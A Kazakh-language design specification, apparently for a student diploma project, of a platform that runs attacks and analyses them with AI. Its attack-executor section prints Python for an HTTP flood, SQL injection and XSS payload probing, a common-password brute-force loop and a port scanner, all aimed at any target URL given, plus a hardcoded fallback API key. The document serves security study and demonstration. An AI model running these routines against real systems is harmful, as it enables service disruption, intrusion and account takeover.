# AI Шабуыл және Қорғаныс Жүйесі - Толық Реализация Сипаттамасы

## 1. Кіріспе

### 1.1 Проект сипаттамасы
Бұл жүйе AI-негізді шабуылдар мен қорғаныс әдістерін зерттеу және демонстрациялау үшін арналған платформа. Жүйе шынайы шабуылдарды орындап, AI арқылы оларды талдап, автоматты қорғаныс механизмдерін қолданады.

### 1.2 Мақсат
- Шабуылдар мен қорғаныс әдістерін зерттеу
- AI-негізді қорғаныс механизмдерін демонстрациялау
- Шынайы шабуылдарды орындау және талдау
- Порт сканерлеу, DDoS, SQL Injection, XSS, Brute Force шабуылдарын симуляциялау

## 2. Архитектура

### 2.1 Жалпы Архитектура
Жүйе клиент-сервер архитектурасына негізделген:

```
┌─────────────────┐
│   Frontend      │
│   (Next.js)     │
│   React/TS      │
└────────┬────────┘
         │ HTTP/REST API
         │
┌────────▼────────┐
│   Backend       │
│   (FastAPI)     │
│   Python        │
└────────┬────────┘
         │
    ┌────┴────┐
    │         │
┌───▼───┐ ┌──▼────┐
│  AI   │ │ Attack│
│Analyzer│ │Executor│
└───────┘ └───────┘
```

### 2.2 Компоненттер
1. **Frontend (Next.js/React)**
   - Пайдаланушы интерфейсі
   - Шабуыл симуляторы
   - Қорғаныс мониторингі
   - Порт сканерлеу
   - Шабуылдар тарихы
   - Статистика

2. **Backend (FastAPI)**
   - REST API эндпоинттер
   - Шабуыл орындау логикасы
   - AI талдау интеграциясы
   - Қорғаныс механизмдері
   - Логирование

3. **AI Analyzer**
   - Cursor AI API интеграциясы
   - OpenAI API fallback
   - Шабуыл талдау
   - Қорғаныс ұсыныстары

4. **Attack Executor**
   - DDoS шабуылдары
   - SQL Injection
   - XSS шабуылдары
   - Brute Force
   - Port Scanning

## 3. Технологиялық Стек

### 3.1 Backend
- **Python 3.13** - Негізгі бағдарламалау тілі
- **FastAPI 0.104.1** - REST API фреймворк
- **Uvicorn** - ASGI сервер
- **Pydantic 2.5.0** - Деректер валидациясы
- **httpx** - Асинхронды HTTP клиент
- **aiohttp** - Асинхронды HTTP клиент
- **python-dotenv** - Environment variables басқару
- **python-jose** - JWT токендер
- **passlib** - Парольдерді хэштеу

### 3.2 Frontend
- **Next.js** - React фреймворк
- **TypeScript** - Типтау
- **React 18** - UI библиотекасы
- **TailwindCSS** - CSS фреймворк
- **Axios** - HTTP клиент
- **React Hot Toast** - Хабарламалар
- **Recharts** - Графиктер

### 3.3 AI Интеграция
- **Cursor AI API** - Негізгі AI сервис
- **OpenAI API** - Резервтік AI сервис

## 4. Backend Реализациясы

### 4.1 API Структурасы

#### 4.1.1 Authentication
```python
# API Key басқару
security = HTTPBearer()

async def verify_api_key(
    credentials: HTTPAuthorizationCredentials = Depends(security),
    api_key: Optional[str] = Header(None, alias="X-API-Key")
) -> bool:
    """API Key тексеру"""
    key = credentials.credentials if credentials else api_key
    return key == os.getenv("API_KEY", "demo-api-key-12345")
```

#### 4.1.2 Шабуыл Эндпоинттер

**POST /api/attacks/simulate**
- Шабуыл бастау
- Параметрлер:
  - `attack_type`: Шабуыл түрі (ddos, sql_injection, xss, brute_force, port_scan)
  - `target_url`: Нысана URL
  - `intensity`: Интенсивтілік (1-10)
  - `duration`: Ұзақтық (секунд)
- Жауап: `AttackResponse` (attack_id, status, message, timestamp)

**GET /api/attacks/{attack_id}**
- Шабуыл статусын алу
- Толық нәтижелер: result, ai_analysis, block_decision

**GET /api/attacks/history**
- Шабуылдар тарихы
- Параметрлер: `limit` (default: 100)
- Жауап: Шабуылдар тізімі (timestamp бойынша сортталған)

#### 4.1.3 Порт Сканерлеу

**POST /api/scan/ports**
- Порт сканерлеу орындау
- Параметрлер:
  - `target_url`: Нысана URL
  - `ports`: Порттар тізімі (optional)
  - `scan_type`: Сканерлеу түрі (common, all, custom)
- Жауап: `PortScanResult` (open_ports, closed_ports, filtered_ports)

#### 4.1.4 Қорғаныс Эндпоинттер

**GET /api/defense/status**
- Қорғаныс статусы
- Жауап: `DefenseStatus` (blocked_attacks, success_rate, active_defenses)

**GET /api/defense/config**
- Қорғаныс конфигурациясы
- Жауап: `DefenseConfig` (mechanisms, settings)

**PUT /api/defense/mechanism/{mechanism_id}**
- Қорғаныс механизмін жаңарту
- Параметрлер: `enabled`, `settings`

#### 4.1.5 Логтар

**GET /api/logs**
- Жүйе логтары
- Параметрлер: `limit`, `level`
- Жауап: `LogEntry[]`

#### 4.1.6 Статистика

**GET /api/statistics**
- Жүйе статистикасы
- Параметрлер: `time_range` (24h, 7d, 30d)
- Жауап: `Statistics` (total_attacks, blocked_attacks, success_rate, time_series)

### 4.2 Attack Executor Реализациясы

#### 4.2.1 DDoS Шабуылы
```python
async def execute_ddos(target_url: str, intensity: int, duration: int):
    """DDoS шабуылын орындау"""
    requests_per_second = intensity * 10  # 1-10 intensity = 10-100 req/s
    requests_sent = 0
    successful_requests = 0
    failed_requests = 0
    
    async with httpx.AsyncClient(timeout=5.0) as client:
        while time.time() - start_time < duration:
            tasks = [make_request(client, target_url) 
                    for _ in range(requests_per_second)]
            results = await asyncio.gather(*tasks)
            
            for result in results:
                requests_sent += 1
                if result:
                    successful_requests += 1
                else:
                    failed_requests += 1
    
    return {
        "requests_sent": requests_sent,
        "successful_requests": successful_requests,
        "failed_requests": failed_requests,
        "average_rps": requests_sent / duration
    }
```

#### 4.2.2 SQL Injection
```python
async def execute_sql_injection(target_url: str, intensity: int, duration: int):
    """SQL Injection шабуылын орындау"""
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        # ... басқа payloads
    ]
    
    attempts = 0
    detected = 0
    vulnerable = 0
    
    async with httpx.AsyncClient(timeout=10.0) as client:
        for payload in sql_payloads[:intensity]:
            test_urls = [
                f"{target_url}?id={payload}",
                f"{target_url}?user={payload}",
                f"{target_url}?search={payload}",
            ]
            
            for test_url in test_urls:
                response = await client.get(test_url)
                response_text = response.text.lower()
                
                # SQL error patterns тексеру
                error_patterns = ["sql syntax", "mysql_fetch", "ORA-", ...]
                if any(pattern in response_text for pattern in error_patterns):
                    vulnerable += 1
                    detected += 1
    
    return {
        "attempts": attempts,
        "detected": detected,
        "vulnerable": vulnerable
    }
```

#### 4.2.3 XSS Шабуылы
```python
async def execute_xss(target_url: str, intensity: int, duration: int):
    """XSS шабуылын орындау"""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        # ... басқа payloads
    ]
    
    attempts = 0
    detected = 0
    vulnerable = 0
    
    # XSS payloads-тарды тестілеу
    # Response-та payload-тардың бар-жоғын тексеру
```

#### 4.2.4 Brute Force
```python
async def execute_brute_force(target_url: str, intensity: int, duration: int):
    """Brute Force шабуылын орындау"""
    common_passwords = [
        "password", "123456", "admin", "root",
        # ... басқа парольдер
    ]
    
    attempts = 0
    blocked = 0
    
    async with httpx.AsyncClient(timeout=5.0) as client:
        for password in common_passwords[:intensity * 2]:
            attempts += 1
            response = await client.post(
                target_url,
                json={"username": "admin", "password": password}
            )
            
            if response.status_code == 429 or response.status_code == 403:
                blocked += 1
    
    return {
        "attempts": attempts,
        "blocked": blocked
    }
```

#### 4.2.5 Port Scanning
```python
async def execute_port_scan(target_url: str, intensity: int, duration: int):
    """Порт сканерлеу"""
    parsed_url = urlparse(target_url)
    host = parsed_url.netloc or parsed_url.path.split('/')[0]
    
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, ...]
    ports_to_scan = common_ports[:intensity * 2]
    
    open_ports = []
    closed_ports = []
    filtered_ports = []
    
    for port in ports_to_scan:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            
            if result == 0:
                open_ports.append(port)
            else:
                closed_ports.append(port)
            
            sock.close()
        except Exception:
            filtered_ports.append(port)
    
    return {
        "host": host,
        "open_ports": open_ports,
        "closed_ports": closed_ports,
        "filtered_ports": filtered_ports,
        "total_scanned": len(ports_to_scan)
    }
```

### 4.3 AI Analyzer Реализациясы

#### 4.3.1 Шабуыл Талдау
```python
async def analyze_attack(attack_type: str, attack_data: Dict[str, Any]) -> Dict[str, Any]:
    """AI арқылы шабуылды талдау"""
    prompt = f"""
    Analyze this {attack_type} attack:
    - Target: {attack_data.get('target_url')}
    - Intensity: {attack_data.get('intensity')}
    - Duration: {attack_data.get('duration')}
    - Results: {attack_data.get('result')}
    
    Provide:
    1. Attack classification
    2. Threat level (Low/Medium/High/Critical)
    3. Confidence score
    4. Recommended defenses
    5. Attack characteristics
    """
    
    # Cursor AI API немесе OpenAI API арқылы талдау
    response = await call_ai_api(prompt)
    
    return {
        "attack_classification": response.classification,
        "threat_level": response.threat_level,
        "confidence": response.confidence,
        "recommended_defenses": response.defenses,
        "characteristics": {
            "pattern": response.pattern,
            "sophistication": response.sophistication,
            "potential_damage": response.damage
        }
    }
```

#### 4.3.2 Қорғаныс Ұсыныстары
```python
async def get_defense_recommendations(attack_summary: str) -> Dict[str, Any]:
    """AI арқылы қорғаныс ұсыныстарын алу"""
    prompt = f"""
    Based on this attack: {attack_summary}
    Recommend specific defense mechanisms and configurations.
    """
    
    response = await call_ai_api(prompt)
    return {
        "recommendations": response.recommendations,
        "priority": response.priority
    }
```

### 4.4 Деректер Құрылымы

#### 4.4.1 Attacks Database (In-Memory)
```python
attacks_db: Dict[str, Dict] = {
    "attack_id": {
        "attack_id": str,
        "status": str,  # running, completed, failed
        "message": str,
        "timestamp": str,
        "estimated_duration": int,
        "attack_type": str,
        "intensity": int,
        "duration": int,
        "target_url": str,
        "result": Dict[str, Any],
        "ai_analysis": Dict[str, Any],
        "block_decision": Dict[str, Any]
    }
}
```

#### 4.4.2 Defense Status
```python
defense_status: Dict[str, Any] = {
    "defense_id": str,
    "status": str,  # active, inactive
    "blocked_attacks": int,
    "total_attacks": int,
    "success_rate": float,
    "active_defenses": List[str],
    "timestamp": str
}
```

#### 4.4.3 Defense Config
```python
defense_config: Dict[str, Any] = {
    "mechanisms": [
        {
            "id": str,
            "name": str,
            "description": str,
            "enabled": bool,
            "settings": Dict[str, Any],
            "stats": {
                "blocked": int,
                "success_rate": float,
                "response_time": float
            }
        }
    ]
}
```

## 5. Frontend Реализациясы

### 5.1 Компоненттер Структурасы

#### 5.1.1 AttackSimulator
- Шабуыл түрін таңдау
- Параметрлерді енгізу (intensity, duration, target_url)
- Шабуылды бастау
- Нәтижелерді көрсету

#### 5.1.2 AttackResults
- Шабуыл нәтижелерін көрсету
- AI талдау
- Блоктау шешімі
- Әр шабуыл түрі үшін арнайы визуализация

#### 5.1.3 AttackHistory
- Барлық шабуылдар тарихы
- Фильтрлеу (статус бойынша)
- Іздеу
- Статистика карточкалары

#### 5.1.4 PortScanner
- Порт сканерлеу интерфейсі
- Нысана URL енгізу
- Сканерлеу түрін таңдау
- Нәтижелерді көрсету (ашық/жабық порттар)

#### 5.1.5 DefenseMonitor
- Қорғаныс статусын көрсету
- Блокталған шабуылдар
- Сәттілік деңгейі
- Нақты уақыт мониторингі

#### 5.1.6 DefenseControl
- Қорғаныс механизмдерін басқару
- Механизмдерді қосу/өшіру
- Баптауларды өзгерту
- Статистика

#### 5.1.7 LogsViewer
- Жүйе логтарын көрсету
- Деңгей бойынша фильтрлеу
- Метадеректерді көрсету

#### 5.1.8 StatisticsChart
- Статистика графиктері
- Уақыт бойынша шабуылдар
- Шабуыл түрлерінің таралуы
- Қорғаныс механизмдерінің пайдалануы

#### 5.1.9 Documentation
- Жүйе құжаттамасы
- Қолдану нұсқаулары
- Шабуыл түрлерінің сипаттамасы
- Қорғаныс механизмдері

### 5.2 API Интеграциясы

#### 5.2.1 API Client
```typescript
const apiClient: AxiosInstance = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8000',
  timeout: 30000,
  headers: {
    'Content-Type': 'application/json',
  },
});

// Request interceptor - API Key қосу
apiClient.interceptors.request.use((config) => {
  const apiKey = Cookies.get('api_key');
  if (apiKey) {
    config.headers['X-API-Key'] = apiKey;
  }
  return config;
});
```

#### 5.2.2 API Функциялары
```typescript
export const api = {
  // Шабуылдар
  async simulateAttack(attackData: AttackRequest): Promise<AttackResponse>,
  async getAttackStatus(attackId: string): Promise<AttackResponse>,
  async getAttackHistory(limit?: number): Promise<AttackResponse[]>,
  
  // Порт сканерлеу
  async scanPorts(scanData: PortScanRequest): Promise<PortScanResult>,
  
  // Қорғаныс
  async getDefenseStatus(): Promise<DefenseStatus>,
  async getDefenseConfig(): Promise<DefenseConfig>,
  async updateDefenseMechanism(id: string, updates: any): Promise<DefenseMechanism>,
  
  // Логтар
  async getLogs(limit?: number, level?: string): Promise<LogEntry[]>,
  
  // Статистика
  async getStatistics(timeRange?: string): Promise<Statistics>,
};
```

### 5.3 State Management
- React Hooks (useState, useEffect)
- Local state басқару
- API response caching
- Auto-refresh механизмдері

### 5.4 UI/UX
- TailwindCSS стильдері
- Dark mode қолдауы
- Responsive дизайн
- Loading states
- Error handling
- Toast notifications

## 6. Шабуыл Түрлері Деталдары

### 6.1 DDoS (Distributed Denial of Service)
- **Мақсаты**: Серверді жүктеу арқылы қызмет көрсетуді тоқтату
- **Реализация**: Асинхронды HTTP сұрауларды көптеген санын жіберу
- **Параметрлер**: 
  - Intensity: 1-10 (10-100 req/s)
  - Duration: секунд
- **Нәтижелер**: requests_sent, successful_requests, failed_requests, average_rps

### 6.2 SQL Injection
- **Мақсаты**: SQL базасына зиянды сұраулар енгізу
- **Реализация**: SQL payloads-тарды тестілеу, error patterns-тарды табу
- **Payloads**: 
  - `' OR '1'='1`
  - `' UNION SELECT NULL--`
  - `admin' --`
- **Нәтижелер**: attempts, detected, vulnerable

### 6.3 XSS (Cross-Site Scripting)
- **Мақсаты**: JavaScript кодты енгізу арқылы пайдаланушыларды алдау
- **Реализация**: XSS payloads-тарды тестілеу
- **Payloads**:
  - `<script>alert('XSS')</script>`
  - `<img src=x onerror=alert('XSS')>`
- **Нәтижелер**: attempts, detected, vulnerable

### 6.4 Brute Force
- **Мақсаты**: Парольдерді тауып алу
- **Реализация**: Жиі қолданылатын парольдерді тестілеу
- **Парольдер**: password, 123456, admin, root, ...
- **Нәтижелер**: attempts, blocked

### 6.5 Port Scanning
- **Мақсаты**: Ашық порттарды табу
- **Реализация**: Socket connection арқылы порттарды тексеру
- **Порттар**: 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), ...
- **Нәтижелер**: open_ports, closed_ports, filtered_ports

## 7. Қорғаныс Механизмдері

### 7.1 AI-негізді Танып Білу
- Шабуылдарды AI арқылы талдау
- Қауіп деңгейін анықтау
- Автоматты блоктау

### 7.2 Rate Limiting
- Сұраулардың жиілігін шектеу
- IP бойынша блоктау

### 7.3 Pattern Detection
- Шабуыл үлгілерін тану
- Зиянды payloads-тарды анықтау

### 7.4 Real-time Monitoring
- Нақты уақыт мониторингі
- Автоматты ескертулер

## 8. AI Интеграция Деталдары

### 8.1 Cursor AI API
- Негізгі AI сервис
- Шабуыл талдау
- Қорғаныс ұсыныстары

### 8.2 OpenAI API (Fallback)
- Резервтік AI сервис
- Cursor AI қолжетімсіз болғанда

### 8.3 AI Талдау Процесі
1. Шабуыл нәтижелерін жинау
2. AI-ға prompt дайындау
3. AI талдауын алу
4. Қорғаныс ұсыныстарын алу
5. Блоктау шешімін қабылдау

## 9. Қауіпсіздік

### 9.1 API Key Authentication
- API Key арқылы аутентификация
- Header немесе Bearer token

### 9.2 Environment Variables
- `.env` файлдары
- API ключтерін қауіпсіз сақтау

### 9.3 CORS Configuration
- Frontend origin-дерге рұқсат
- Credentials қолдауы

## 10. Логирование

### 10.1 Log Деңгейлері
- INFO: Ақпараттық хабарламалар
- WARNING: Ескертулер
- ERROR: Қателер
- SUCCESS: Сәтті операциялар

### 10.2 Log Категориялары
- ATTACK: Шабуыл операциялары
- DEFENSE: Қорғаныс операциялары
- AI: AI талдау операциялары
- SYSTEM: Жүйе операциялары

## 11. Тестілеу және Демонстрация

### 11.1 Тестілеу Сценарийлері
1. DDoS шабуылын орындау
2. SQL Injection тестілеу
3. XSS шабуылын тестілеу
4. Brute Force тестілеу
5. Порт сканерлеу

### 11.2 Демонстрация
- Шынайы шабуылдарды орындау
- AI талдауын көрсету
- Қорғаныс механизмдерін демонстрациялау

## 12. Қорытынды

Бұл жүйе AI-негізді шабуылдар мен қорғаныс әдістерін зерттеу үшін толық функционалды платформаны қамтамасыз етеді. Жүйе шынайы шабуылдарды орындап, AI арқылы оларды талдап, автоматты қорғаныс механизмдерін қолданады.

### 12.1 Негізгі Ерекшеліктер
- 5 түрлі шабуылды орындау
- AI-негізді талдау
- Автоматты қорғаныс
- Нақты уақыт мониторингі
- Толық статистика
- Порт сканерлеу

### 12.2 Технологиялар
- Backend: Python, FastAPI
- Frontend: Next.js, React, TypeScript
- AI: Cursor AI API, OpenAI API
- Styling: TailwindCSS

### 12.3 Болашақ Дамыту
- Деректер қорына интеграция
- Көптеген AI провайдерлерді қолдау
- Көбірек шабуыл түрлері
- Кеңейтілген қорғаныс механизмдері

---

**Дата**: 2024  
**Автор**: Диплом жұмысы  
**Тіл**: Қазақ тілі  
**Лицензия**: Зерттеу мақсатында

